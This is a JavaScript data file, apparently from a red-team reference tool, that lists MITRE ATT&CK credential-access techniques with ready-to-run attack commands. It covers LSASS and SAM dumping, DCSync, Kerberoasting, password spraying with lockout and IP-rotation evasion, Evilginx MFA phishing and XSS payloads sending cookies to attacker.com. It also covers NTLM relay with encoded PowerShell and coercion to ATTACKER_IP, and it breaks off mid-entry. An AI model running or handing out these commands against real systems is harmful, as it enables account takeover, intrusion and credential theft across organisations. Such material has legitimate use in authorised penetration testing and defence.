export const CREDENTIAL_ACCESS = {
  id: "credential-access",
  name: "Credential Access",
  tacticId: "TA0006",
  subtitle: "OS Cred Dumping • Kerberoast • AS-REP • Brute Force • MFA Intercept • Token Theft • Password Stores • Keychain • KeePass • Coercion • DPAPI • Timeroasting • Shadow Creds • SCCM • Golden Ticket • Diamond • ExtraSID • Cert Theft/Forge • API Hooking • Trust Ticket",
  color: "#f97316",
  techniques: [
    {
      name: "OS Credential Dumping",
      id: "T1003",
      summary: "Mimikatz • LSASS • SAM • NTDS.dit • secretsdump",
      description: "Extract credential material from operating system memory and storage",
      tags: ["Mimikatz", "LSASS", "SAM", "NTDS.dit", "T1003"],
      steps: [
        "Method 1 — LSASS memory dump (classic):\n# LSASS (Local Security Authority Subsystem Service) holds credentials in memory for SSO\n# Credentials present: NT hashes, Kerberos tickets, DPAPI keys, and sometimes cleartext (if WDigest enabled)\n# Using built-in comsvcs.dll MiniDump (no extra tools, but very detected):\n$ tasklist /FI 'IMAGENAME eq lsass.exe'  # Get LSASS PID (e.g., 788)\n$ rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 788 C:\\Windows\\Temp\\l.dmp full\n# Stealthier: use procdump (signed Sysinternals) — less AV suspicion\n$ procdump.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp\n# Transfer dump to Linux attacker machine for offline parsing (avoids running Mimikatz on target)",
        "Method 2 — Parse LSASS dump offline (Linux or Windows):\n# Offline parsing: no AV on attacker machine scanning for Mimikatz signatures\n$ pypykatz lsa minidump lsass.dmp  # Linux/Python\n# Extracts: NT hashes, SHA1 hashes, DPAPI masterkeys, Kerberos tickets, and cleartext (if WDigest)\n$ pypykatz lsa minidump lsass.dmp -o lsass_results.json\n# Sort output by type — NT hashes go to crackhash + PTH; Kerberos ccaches go to PtT\n# Windows offline parsing with Mimikatz:\n$ mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonPasswords' exit",
        "Method 3 — SAM database extraction (local account NT hashes):\n# SAM (Security Account Manager) stores local user hashes — requires SYSTEM or admin\n# SAM is locked by the OS while running — use registry export trick:\n$ reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive\n$ reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hive\n$ reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive  # Also grab SECURITY for LSA secrets\n# Parse offline:\n$ secretsdump.py -sam sam.hive -system sys.hive -security security.hive LOCAL\n# Yields: local user NT hashes + LSA secrets (service account plaintext passwords)",
        "Method 4 — DCSync (remote NTDS.dit dump without touching DC disk):\n# DCSync mimics Domain Controller replication — requests credential data via MS-DRSR protocol\n# Requires: Domain Admin, or account with DS-Replication rights (GenericAll on domain object)\n# Remote (no files needed, just network access to DC):\n$ secretsdump.py domain/admin:pass@DC_IP\n# Dumps: all domain hashes (ntds.dit equivalent), Kerberos keys, historical hashes\n# More targeted — specific user:\n$ secretsdump.py domain/admin:pass@DC_IP -just-dc-user krbtgt\n$ secretsdump.py domain/admin:pass@DC_IP -just-dc-user administrator\n# Offline ntds.dit extraction (if you have the file):\n$ ntdsutil 'ac i ntds' 'ifm' 'create full C:\\Temp' q q\n$ secretsdump.py -ntds 'C:\\Temp\\Active Directory\\ntds.dit' -system C:\\Temp\\registry\\SYSTEM LOCAL",
        "Method 5 — Remote LSASS dump via lsassy (no files on target disk):\n# lsassy uses multiple dump methods + parses remotely — very stealthy\n$ lsassy -u admin -p pass -d domain.com 192.168.1.100\n# Dump methods available: -m comsvcs, ppldump, dumpertdll, mirrordump, nanodump\n$ lsassy -u admin -p pass -d domain.com 192.168.1.100 -m nanodump\n# nanodump: creates a minidump from userland — no procdump, no comsvcs.dll\n# Also useful: nanodump alone (no lsassy wrapper) for C2-integrated ops\n# Alternative: lsass dump via Task Manager (GUI) → right-click lsass → Create dump file"
      ]
    },
    {
      name: "Kerberoasting",
      id: "T1558.003",
      summary: "GetUserSPNs • hashcat 13100 • TGS cracking",
      description: "Request Kerberos service tickets for accounts with SPNs and crack offline",
      tags: ["GetUserSPNs", "hashcat 13100", "TGS", "T1558"],
      steps: [
        "Step 1 — Enumerate service accounts with SPNs:\n# Service Principal Names (SPNs) identify services running under specific accounts\n# Any authenticated domain user can request a TGS (service ticket) for ANY SPN\n# The TGS is encrypted with the service account's password — can be cracked offline\n$ GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request -outputfile tgs_hashes.txt\n# -request: immediately fetch TGS tickets; -outputfile: save hashes for cracking\n$ nxc ldap DC_IP -u user -p pass --kerberoasting kerberoast_output.txt\n$ Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec  # /rc4opsec: skip AES-only accounts",
        "Step 2 — Filter for crackable accounts:\n$ grep -v '\\$' tgs_hashes.txt > user_tgs.txt\n# Machine accounts (ending in $) use 120-char random passwords — uncrackable\n# High-value targets: MSSQLSvc, http/, TERMSRV, IMAP, SMTP service accounts\n# Check account descriptions for hints:\n$ GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request | grep -A2 'MSSQLSvc'",
        "Step 3 — Crack TGS hashes offline:\n# Hashcat modes: 13100 = etype 23 (RC4); 19600 = etype 17 (AES128); 19700 = etype 18 (AES256)\n$ hashcat -m 13100 user_tgs.txt /usr/share/wordlists/rockyou.txt\n# Add rules for better coverage (password+year patterns common for service accounts):\n$ hashcat -m 13100 user_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n# Custom wordlist from org: company name, domain name + year/symbol variations\n$ echo -e 'Target2024!\\nTargetCorp1\\nServiceAcc!' > custom.txt && hashcat -m 13100 user_tgs.txt custom.txt",
        "Step 4 — Targeted Kerberoasting (GenericWrite → add SPN → roast):\n# If you have GenericWrite on a user, you can SET an SPN, making them Kerberoastable\n$ targetedKerberoast.py -u attacker -p pass -d domain.com --only-abuse -v\n# Process: adds SPN → requests TGS → captures hash → removes SPN (cleaning up)\n# Target high-value accounts that don't normally have SPNs (Domain Admin members)\n# Hash captured for normally-unroastable accounts — very powerful",
        "Step 5 — Use cracked service account credentials:\n# Service accounts often have broad permissions to access resources they service\n# MSSQLSvc → sysadmin on SQL Server → xp_cmdshell → OS shell\n$ mssqlclient.py domain/svc_sql:CrackedPass@192.168.1.100\n> EXEC xp_cmdshell 'whoami'\n# http/ account → admin on IIS → web.config credentials\n# If service account has domain admin rights (common misconfiguration): immediate DA"
      ]
    },
    {
      name: "AS-REP Roasting",
      id: "T1558.004",
      summary: "GetNPUsers • no preauth • hashcat 18200",
      description: "Capture Kerberos AS-REP responses for accounts without pre-authentication required",
      tags: ["GetNPUsers", "no preauth", "hashcat 18200", "T1558"],
      steps: [
        "Enumerate accounts without pre-auth:\n$ GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip DC_IP\n$ nxc ldap DC_IP -u user -p pass --asreproast asrep.txt\n$ rubeus.exe asreproast /outfile:asrep.txt\n# Returns AS-REP hash for each vulnerable account",
        "Without valid credentials (null session):\n$ GetNPUsers.py domain.com/ -no-pass -dc-ip DC_IP\n# Requires list of usernames\n# Build username list from LDAP enum or email harvesting",
        "Crack AS-REP hashes:\n$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n$ hashcat -m 18200 asrep.txt wordlist.txt -r best64.rule --force\n$ john --wordlist=rockyou.txt --format=krb5asrep asrep.txt\n# hashcat 18200 = etype 23 (RC4)",
        "Find AS-REP roastable via LDAP:\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName\n# userAccountControl bit 0x400000 = DONT_REQ_PREAUTH",
        "Exploit cracked credentials:\n# Use cracked password for RDP, SMB, PowerShell remoting\n# Check group membership: net user <cracked_account> /domain\n# Escalate via cracked service account"
      ]
    },
    {
      name: "Brute Force",
      id: "T1110",
      summary: "Password spray • credential stuffing • dictionary • hydra • medusa",
      description: "Systematically try credentials to gain access to accounts and systems",
      tags: ["hydra", "medusa", "spray", "credential stuffing", "T1110"],
      steps: [
        "Step 1 — Enumerate lockout policy BEFORE spraying:\n# Never spray without knowing the lockout policy — account lockouts create noisy alerts and operational disruption\n$ nxc smb DC_IP -u user -p pass --pass-pol\n$ net accounts /domain  # Shows: lockout threshold, observation window, duration\n# Fine-grained policies (different per group) — check these too:\n$ Get-ADFineGrainedPasswordPolicy -Filter * | Select Name,LockoutThreshold,LockoutObservationWindow\n# Safe spray rate: (lockout_threshold - 1) attempts per observation_window\n# Example: threshold=5, window=30min → max 4 sprays per 30 minutes",
        "Step 2 — Domain password spraying (Kerberos — less noisy than NTLM):\n# Kerberos spray generates fewer Event IDs than NTLM spray (no 4625 in many configs)\n$ kerbrute passwordspray -d domain.com users.txt 'Summer2024!' --dc DC_IP\n# --safe: auto-stops if lockout detected\n# Common seasonal passwords: Summer2024!, Winter2024!, Company@2024, Welcome1\n# NTLM spray (fallback, more logs but works without DC network access):\n$ nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success\n# Wait full observation window between password attempts\n# Track which accounts have BadPwdCount > 0 — skip them",
        "Step 3 — Cloud/web service spraying:\n# M365/Azure AD spray with fireprox (rotates IPs to bypass Smart Lockout):\n$ python3 trevorspray.py -u emails.txt -p 'Summer2024!' --spray --module msol --fireprox REGION\n# AADInternals for Azure AD spray:\n$ Invoke-AADIntReconAsOutsider -DomainName target.com  # Check auth endpoints first\n$ Get-AADIntCredentials -Username user@target.com -Password 'Summer2024!'  # Single test\n# credmaster: modular sprayer with delay and jitter\n$ credmaster.py --username-file emails.txt --password-file passwords.txt --module o365 --delay 5 --jitter 2",
        "Step 4 — Credential stuffing from breach data:\n# Use breached email:password pairs — higher success rate than blind spraying\n$ grep '@target.com' breach_dump.txt | head -1000 > target_creds.txt\n# Spray unique passwords from breach at target services:\n$ python3 trevorspray.py --userfile target_creds.txt --module msol --spray\n# credmaster for VPN/Citrix spraying:\n$ credmaster.py --username-file users.txt --password-file top100_breach_passwords.txt --module citrixgateway --target vpn.target.com\n# Priority services: OWA/M365 (email access), VPN (network access), Citrix (desktop access)",
        "Step 5 — Validate without lockout risk:\n# Use Kerberos user enumeration (no failed auth — just AS-REQ, no response needed):\n$ kerbrute userenum -d domain.com --dc DC_IP users.txt\n# Returns: VALID_USERNAME or NOT FOUND — no passwords tried, no lockout possible\n# After finding valid users, spray only confirmed-valid accounts\n# Monitor BadPwdCount during spray:\n$ Get-ADUser -Filter * -Properties BadPwdCount | Where {$_.BadPwdCount -gt 0} | Select Name,BadPwdCount"
      ]
    },
    {
      name: "Multi-Factor Authentication Interception",
      id: "T1111",
      summary: "Evilginx • Modlishka • AiTM • TOTP theft • SIM swap",
      description: "Intercept or bypass multi-factor authentication tokens and sessions",
      tags: ["AiTM", "Evilginx", "TOTP theft", "SIM swap", "T1111"],
      steps: [
        "AiTM proxy for MFA bypass with Evilginx2:\n$ evilginx2 -developer\n> : config domain attacker.com\n> : config ip 1.2.3.4\n> : phishlets hostname microsoft attacker.com\n> : lures create microsoft\n# Captures session cookies even with MFA",
        "Modlishka reverse proxy setup:\n$ ./modlishka -config o365_config.json\n# config: trackingCookie, target: login.microsoft.com\n# All traffic proxied, session tokens captured",
        "SIM swapping:\n# Social engineer mobile carrier support\n# Transfer victim phone number to attacker SIM\n# Receive victim's SMS MFA codes\n# Access accounts secured only by SMS MFA",
        "TOTP theft via malware:\n# Steal Google Authenticator backup seeds from mobile device backup\n# Extract TOTP secrets from Authy (encrypted backup)\n# Keylog OTP codes and use immediately (30-second window)\n$ adb backup com.google.android.apps.authenticator2 -f auth_backup.ab",
        "Push notification fatigue (MFA bombing):\n# Send repeated MFA push requests\n# Target accepts exhausted by notifications\n# Social engineer: 'I'm IT, please accept the pending MFA'\n# Microsoft Authenticator number matching (mitigates this)"
      ]
    },
    {
      name: "Steal Application Access Token",
      id: "T1528",
      summary: "OAuth token theft • Bearer token • cloud token • cookie hijack",
      description: "Steal OAuth tokens, API keys, and session tokens for unauthorized access",
      tags: ["OAuth", "Bearer token", "cookie", "T1528"],
      steps: [
        "Extract cloud tokens from environment:\n$ env | grep -i 'token\\|key\\|secret\\|credential'\n$ cat ~/.aws/credentials\n$ cat ~/.azure/credentials\n$ cat ~/.config/gcloud/application_default_credentials.json\n# Cloud SDKs cache credentials in well-known locations",
        "Azure/O365 token theft with ROADtools:\n$ roadtx gettokens -u user@tenant.onmicrosoft.com -p 'Password' -t tenant.onmicrosoft.com\n$ roadtx describe -t eyJ0eXAiOiJKV1Qi...  # Decode and inspect token claims\n# Dump all tokens cached by Azure CLI / MSAL:\n$ cat ~/.azure/msal_token_cache.json\n$ roadrecon auth -u user@tenant.com -p 'Password' && roadrecon gather\n# roadrecon gather enumerates all Azure AD objects using the stolen token\n$ python3 -c \"import base64,json; print(json.dumps(json.loads(base64.b64decode(token.split('.')[1]+'==')), indent=2))\"",
        "Browser cookie extraction with SharpChrome:\n$ SharpChrome.exe cookies\n$ SharpChrome.exe cookies /showall  # Include expired/session cookies\n# SharpChrome uses DPAPI internally — no masterkey needed when run as the target user\n# For offline decryption with a known masterkey:\n$ SharpChrome.exe cookies /pvk:domain_backup_key.pvk\n# Linux alternative — extract Chrome cookies via sqlite3:\n$ cp ~/.config/google-chrome/Default/Cookies /tmp/cookies.db\n$ sqlite3 /tmp/cookies.db 'SELECT host_key, name, encrypted_value FROM cookies;'\n# Decrypt encrypted_value with the Chrome key stored in ~/.config/google-chrome/Default/Local\\ State",
        "AWS IMDSv1 SSRF token theft:\n$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n# Returns temporary AWS credentials (AccessKey, SecretKey, Token)\n# Use via SSRF vulnerability in web app",
        "Azure IMDS token theft from VM:\n$ curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'\n# Returns Azure management API token\n# From SSRF or code execution on Azure VM"
      ]
    },
    {
      name: "Steal Web Session Cookie",
      id: "T1539",
      summary: "XSS cookie theft • MITM • malware • BeEF • session hijack",
      description: "Steal authenticated web session cookies to bypass authentication",
      tags: ["XSS", "session hijack", "MITM", "T1539"],
      steps: [
        "XSS-based cookie theft:\n> <script>document.location='https://attacker.com/steal?c='+btoa(document.cookie)</script>\n> <img src=x onerror=\"new Image().src='https://attacker.com/c?'+document.cookie\">\n# HttpOnly cookies protected from JavaScript\n# Non-HttpOnly session cookies fully accessible",
        "MITM session cookie interception:\n$ mitmproxy -p 8080\n# or bettercap:\n$ bettercap -eval 'arp.spoof on; net.sniff on; net.sniff.filter http'\n# Capture session cookies from HTTP traffic\n# HTTPS: requires SSLstrip or certificate spoofing",
        "Extract cookies from browser (Windows) with HackBrowserData:\n$ hackbrowserdata.exe -b chrome -f json -o loot/\n# Extracts: cookies, saved passwords, history, bookmarks from Chrome/Edge/Firefox\n# Uses DPAPI automatically when run in user context\n# Output: loot/chrome_cookie.json with decrypted cookie values\n# Manual approach via sqlite3 + DPAPI (PowerShell):\n> $cookiePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\"\n> Add-Type -AssemblyName System.Security\n> $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection \"Data Source=$cookiePath\"\n> # Query encrypted_value column, then:\n> [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, 'CurrentUser')",
        "Cookie import into browser:\n# Use EditThisCookie extension or DevTools\n# Application → Cookies → Set cookie values\n# Or with curl:\n$ curl -H 'Cookie: session=STOLEN_TOKEN' https://target.com/dashboard\n# Hijacks authenticated session without knowing password",
        "Eternal session cookie attacks:\n# Some apps don't expire cookies\n# 'Remember me' tokens may last years\n# Useful: steal cookie once, maintain access indefinitely"
      ]
    },
    {
      name: "Unsecured Credentials",
      id: "T1552",
      summary: "Bash history • config files • environment variables • credential files • cloud metadata",
      description: "Find credentials stored insecurely in files, environment variables, and configuration",
      tags: ["bash history", "config files", "env vars", "T1552"],
      steps: [
        "Search for credentials in files:\n$ grep -rni 'password\\|passwd\\|secret\\|api_key\\|token' /etc/ 2>/dev/null\n$ grep -rni 'password\\|secret\\|key' /home/ --include='*.conf' --include='*.ini' --include='*.env' 2>/dev/null\n$ find / -name '*.env' -o -name '*.config' -o -name 'web.config' 2>/dev/null",
        "History files:\n$ cat ~/.bash_history | grep -Ei '(password|passwd|-p |--password|mysql|psql)'\n$ cat ~/.zsh_history\n$ cat ~/.python_history\n# Developers often type passwords directly in commands\n# mysql -u root -pSECRET or curl -u user:pass ...",
        "Cloud credential files:\n$ cat ~/.aws/credentials\n$ cat ~/.aws/config\n$ cat ~/.azure/credentials\n$ cat ~/.config/gcloud/application_default_credentials.json\n$ cat /root/.kube/config\n# Kubernetes config often contains cluster admin credentials",
        "Docker and container credentials:\n$ docker inspect <container_id> | grep -i 'env\\|password'\n$ cat /etc/docker/daemon.json\n$ docker run --rm alpine cat /run/secrets/db_password\n# Docker secrets mounted in /run/secrets\n# Environment variables passed to containers often contain creds",
        "Windows credential locations:\n$ cmdkey /list\n$ net use\n# Stored credentials in Credential Manager\n$ dir /s /b C:\\Users\\*.xml | findstr -i 'password\\|cred'\n> [xml]$x = Get-Content 'Groups.xml'; [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($x.Groups.User.Properties.cpassword), $null, 'LocalMachine'))\n# GPP XML files with cpassword - Group Policy Preferences"
      ]
    },
    {
      name: "Adversary-in-the-Middle",
      id: "T1557",
      summary: "LLMNR/NBT-NS • Responder • ntlmrelayx • AiTM • WPAD",
      description: "Position between client and server to intercept and relay authentication",
      tags: ["Responder", "ntlmrelayx", "LLMNR", "WPAD", "T1557"],
      steps: [
        "LLMNR/NBT-NS poisoning with Responder — how it works:\n# LLMNR (Link-Local Multicast Name Resolution) and NBT-NS are fallback name resolution protocols\n# When a Windows host can't resolve a hostname via DNS, it broadcasts an LLMNR/NBT-NS query to the local subnet\n# Responder answers these queries claiming to be the requested host\n# The victim then tries to authenticate to Responder → we capture their NTLM hash\n$ responder -I eth0 -wrd  # -w: WPAD, -r: redirect, -d: DHCP\n# Captured hashes saved to: /usr/share/responder/logs/NTLMv2-*.txt\n$ hashcat -m 5600 /usr/share/responder/logs/NTLMv2-SMB-192.168.1.*.txt rockyou.txt\n# Cracked hash = domain account password → use for PTH/spray\n# Note: LLMNR can be disabled by GPO — check with: Get-NetAdapterBinding -ComponentID ms_msclient",
        "NTLM relay to SMB — code execution without cracking:\n# NTLM relay is more powerful than capture+crack: get shell, not just hash\n# Requirement: target SMB server must NOT have signing required\n$ nmap -p 445 192.168.1.0/24 --script smb-security-mode | grep 'message_signing: disabled' -B5 | grep 'Nmap scan' | awk '{print $5}' > nosigning.txt\n# Disable Responder's SMB+HTTP (they would capture, not relay):\n$ sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\n$ responder -I eth0 -wrd &\n$ ntlmrelayx.py -tf nosigning.txt -smb2support -c 'powershell -enc BASE64'\n# One victim auth → code execution on every target in nosigning.txt simultaneously",
        "NTLM relay to LDAP — AD modification without cracking:\n# LDAP relay: use relayed creds to modify AD objects\n# Relay to LDAP for RBCD setup (gives us ability to impersonate any user on target):\n$ ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support\n# Relay to LDAPS for shadow credentials on target:\n$ ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target 'VICTIM$' -smb2support\n# Relay for LDAP enumeration dump:\n$ ntlmrelayx.py -t ldap://DC_IP -l /tmp/ldap_dump -smb2support\n# LDAP relay doesn't require SMB signing to be disabled on DC — only on the victim machine",
        "WPAD poisoning — capture proxy credentials:\n# Web Proxy Auto-Discovery: browsers query wpad.domain.com or via LLMNR\n# If no WPAD server exists, Responder can serve a fake one\n# When browser authenticates to the fake proxy: captures NTLM NTLMv2 hash\n$ responder -I eth0 -wPrd\n# -w: WPAD server; -P: force proxy auth (NTLM ProxyAuth)\n# Every browser on the network querying WPAD authenticates to Responder\n# Higher-privilege targets: domain computers auto-authenticate via machine account\n# ProxyAuth NTLMv2 hashes can be relayed just like SMB hashes",
        "IPv6 MITM (mitm6) — works when LLMNR is disabled:\n# mitm6 exploits the fact that Windows prefers IPv6 DNS over IPv4 DNS\n# Sends DHCPv6 responses, becomes the IPv6 DNS server for machines on the subnet\n# Then responds to WPAD DNS queries → machines authenticate to our WPAD → NTLM relay\n$ mitm6 -d domain.com  # Start IPv6 DNS spoofing\n$ ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.domain.com --delegate-access -smb2support\n# Extremely effective: no LLMNR dependency, passive, machines trigger naturally\n# Every 30 minutes (DHCP renewal): machines re-query WPAD → fresh auth opportunities\n# Mitigation: disable IPv6 if not needed, deploy WPAD records with stub entries"
      ]
    },
    {
      name: "Network Sniffing",
      id: "T1040",
      summary: "tcpdump • Wireshark • passive credential capture • pcap analysis",
      description: "Capture network traffic to find credentials, session tokens, and sensitive data",
      tags: ["tcpdump", "Wireshark", "passive capture", "T1040"],
      steps: [
        "Capture network traffic:\n$ tcpdump -i eth0 -w capture.pcap\n$ tcpdump -i eth0 port 21 or port 23 or port 110 or port 143 -w creds.pcap\n# Capture FTP, Telnet, POP3, IMAP (cleartext protocols)",
        "Filter for credentials in pcap:\n$ tcpdump -r capture.pcap -A | grep -Ei '(pass|password|user|login)'\n$ tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data\n# Extract POST data from HTTP captures",
        "Extract credentials from network:\n$ python3 net-creds.py -p capture.pcap\n$ credsniper --target capture.pcap\n# Automated credential extraction from pcap files\n# Finds: FTP, HTTP, IMAP, SMTP, POP3, Telnet, IRC creds",
        "Passive NTLM hash capture:\n$ pcredz -f capture.pcap\n# Extracts NTLM hashes, Kerberos tickets from pcap\n# Offline crack with hashcat",
        "Promiscuous mode for local network sniffing:\n$ ip link set eth0 promisc on\n$ ifconfig eth0 promisc\n# Capture all traffic on local segment (works on hubs, not switches)\n# On switched networks: need ARP spoofing first"
      ]
    },
    {
      name: "Forge Web Credentials",
      id: "T1606",
      summary: "SAML golden • JWT forging • OAuth code • cookie forging",
      description: "Forge authentication tokens and credentials to access services without valid creds",
      tags: ["Golden SAML", "JWT forging", "OAuth", "T1606"],
      steps: [
        "Golden SAML attack:\n$ ADFSDump.exe /domain:domain.com /server:adfs.domain.com\n# ADFSDump is a C# tool (not Python) — run on the ADFS server or with DA\n# Extracts: ADFS token signing certificate + DKM encryption key from AD\n# Decrypt the signing cert private key using the DKM key, then forge with shimit:\n$ python3 shimit.py -pk adfs_signing_key.pem -c adfs_cert.pem -u admin@domain.com -r 'http://schemas.microsoft.com/ws/2008/06/identity/claims/role=Administrator'\n# Forge SAML assertion for any user — accepted by O365, AWS, Salesforce, etc.",
        "JWT algorithm confusion (RS256 → HS256):\n# Get public key from /jwks.json endpoint\n# Forge token signed with public key using HS256\n$ python3 jwt_tool.py -X a TOKEN\n# If server uses public key as HS256 secret: forge any JWT\n$ python3 jwt_tool.py TOKEN -X a -pk server_public.pem",
        "JWT none algorithm:\n# Modify JWT header: {\"alg\":\"none\"} and remove signature\n$ python3 jwt_tool.py TOKEN -X n\n# Some implementations accept tokens with alg:none\n# CVE vulnerability in popular JWT libraries",
        "Azure AD token forging (Silver Ticket for Azure):\n# Compromise token signing key from ADFS or Azure AD\n# Use PyMSAL or roadtx to forge access tokens\n$ roadtx gettokens --client-id CLIENT_ID --tenant TENANT --saml-assertion FORGED_SAML\n# Access Azure resources as any user",
        "OAuth authorization code interception:\n# Open redirect in OAuth flow: redirect_uri=https://attacker.com\n# Authorization code leaked to attacker\n$ curl -s 'https://auth.target.com/oauth/authorize?client_id=X&redirect_uri=https://attacker.com&code=STOLEN_CODE'\n# Exchange code for access token"
      ]
    },
    {
      name: "Coercion Attacks",
      id: "T1187.coerce",
      summary: "PetitPotam • Coercer • DFSCoerce • PrinterBug • NTLM relay to AD CS",
      description: "Force domain computers and DCs to authenticate to attacker-controlled hosts via protocol abuse",
      tags: ["PetitPotam", "Coercer", "DFSCoerce", "PrinterBug", "T1187"],
      steps: [
        "PetitPotam — coerce DC authentication via MS-EFSRPC:\n$ python3 PetitPotam.py -u user -p pass -d domain.com ATTACKER_IP DC_IP\n$ python3 PetitPotam.py ATTACKER_IP DC_IP  # Unauthenticated (older DCs)\n# DC will authenticate to ATTACKER_IP via NTLM\n# Capture hash with Responder or relay to ADCS/LDAP",
        "Coercer — all-in-one coercion framework:\n$ python3 Coercer.py coerce -u user -p pass -d domain.com -l ATTACKER_IP -t DC_IP\n$ python3 Coercer.py scan -u user -p pass -d domain.com -t 192.168.1.0/24\n# Scans for and exploits dozens of coercion methods:\n# MS-RPRN (PrinterBug), MS-EFSRPC, MS-DFSNM, MS-FSRVP, MS-WKST",
        "DFSCoerce — MS-DFSNM coercion:\n$ python3 dfscoerce.py -u user -p pass -d domain.com ATTACKER_IP DC_IP\n# Coerces machine account authentication via DFS\n# Works even when MS-RPRN and MS-EFSRPC are patched",
        "Relay coerced auth to ADCS HTTP (ESC8):\n$ ntlmrelayx.py -t http://ADCS_SERVER/certsrv/certfnsh.asp --adcs --template DomainController\n# Simultaneously run coercion:\n$ python3 PetitPotam.py -u user -p pass ATTACKER_IP DC_IP\n# Relays DC$ auth to ADCS → issues certificate for DC$\n# Use cert to get TGT (PKINIT) → DCSync",
        "Relay coerced auth to LDAPS (RBCD or shadow creds):\n$ ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user lowpriv\n$ python3 Coercer.py coerce -u lowpriv -p pass -d domain.com -l ATTACKER_IP -t TARGET_HOST\n# Relay machine account NTLM to LDAPS\n# Set RBCD: lowpriv can impersonate anyone on TARGET"
      ]
    },
    {
      name: "DPAPI Secrets",
      id: "T1555.DPAPI",
      summary: "DonAPI • SharpDPAPI • dpluot • DPAPI masterkeys",
      description: "Decrypt DPAPI-protected secrets including browser credentials, certificate private keys, and stored passwords",
      tags: ["SharpDPAPI", "DonAPI", "DPAPI", "T1555"],
      steps: [
        "Dump DPAPI masterkeys with SharpDPAPI:\n$ SharpDPAPI.exe masterkeys /rpc\n$ SharpDPAPI.exe masterkeys /pvk:domain_backup_key.pvk\n# /rpc: uses MS-BKRP to retrieve domain backup key from DC\n# Domain backup key decrypts ALL user DPAPI masterkeys in domain",
        "Extract domain DPAPI backup key:\n$ python3 dpapi.py backupkeys -u admin -p pass -d domain.com\n$ lsadump::backupkeys /system:DC_IP /export\n# Domain backup key = decrypt any user's DPAPI secrets on any machine\n# Stored in DC LSA secrets, requires domain admin",
        "Remote DPAPI decryption with dpapi.py (Impacket):\n$ dpapi.py backupkeys -t domain.com/admin:pass@DC_IP --export\n# Exports domain DPAPI backup key as .pvk file\n$ dpapi.py masterkey -file 'S-1-5-21-...-1001\\MASTERKEY_GUID' -pvk domain_backup_key.pvk\n# Decrypts a user's masterkey blob using the domain backup key\n$ dpapi.py credential -file cred_blob_file -key DECRYPTED_MASTERKEY\n# Decrypts individual credential blob — yields plaintext credentials\n# Or use SharpDPAPI for all-in-one remote triage:\n$ SharpDPAPI.exe triage /pvk:domain_backup_key.pvk",
        "SharpDPAPI for browser credentials:\n$ SharpDPAPI.exe credentials\n$ SharpDPAPI.exe vaults\n$ SharpDPAPI.exe triage\n# Decrypts: Chrome/Edge saved passwords, Windows Credential Manager\n# Requires user-level access (HKCU DPAPI) or domain backup key",
        "Decrypt DPAPI remotely with secretsdump:\n$ secretsdump.py domain/admin:pass@192.168.1.100 -just-dc-user krbtgt\n# Extract LSA DPAPI secrets remotely\n$ python3 dpapi.py credential -file credential_blob -key MASTERKEY\n# Manually decrypt a credential blob with known masterkey"
      ]
    },
    {
      name: "Timeroasting",
      id: "T1558.timeroast",
      summary: "timeroast • NTP ms-SNTP • computer account hashes",
      description: "Request NTP responses from the DC with computer account credentials to crack offline via MS-SNTP",
      tags: ["timeroast", "NTP", "MS-SNTP", "computer accounts", "T1558"],
      steps: [
        "Timeroasting — exploit MS-SNTP for computer hash capture:\n$ python3 timeroast.py DC_IP\n$ python3 timeroast.py DC_IP -o timeroast_hashes.txt\n# Sends NTP requests; DC responds with MS-SNTP authenticator\n# Authenticator = MD5-HMAC keyed with computer account NT hash\n# Works unauthenticated against all DCs",
        "Targeted timeroasting (specific RIDs):\n$ python3 timeroast.py DC_IP --rids 1000-2000\n# Target specific RID ranges for computer accounts\n# Computer accounts created sequentially by default RID",
        "Crack timeroast hashes:\n$ hashcat -m 31300 timeroast_hashes.txt wordlist.txt\n# Mode 31300: MS-SNTP NTP-MD5 (timeroast format)\n# Computer account passwords set by admin may be weak\n# Default computer account passwords are 120-char random (uncrackable)\n# Target: manually-set weak computer account passwords",
        "Identify potentially weak computer accounts:\n# Computer accounts with old pwdLastSet (manually set, not rotated)\n# Computer accounts with description field (may contain password hint)\n$ Get-ADComputer -Filter * -Properties pwdLastSet,Description | Where {$_.pwdLastSet -lt (Get-Date).AddYears(-1)}\n# Old pwdLastSet = may have manually set weak password",
        "Use cracked computer account:\n# Computer account creds → authenticate as machine to SMB, LDAP\n$ nxc smb DC_IP -u 'COMPUTER$' -p 'CrackedPass'\n$ secretsdump.py domain/'COMPUTER$':CrackedPass@DC_IP\n# Machine accounts can DCSync if granted rights\n# Or use for RBCD / constrained delegation abuse"
      ]
    },
    {
      name: "Shadow Credentials",
      id: "T1556.shadow",
      summary: "pywhisker • Whisker • msDS-KeyCredentialLink • PKINIT",
      description: "Add a Key Credential to a target's msDS-KeyCredentialLink attribute to authenticate as that user via PKINIT",
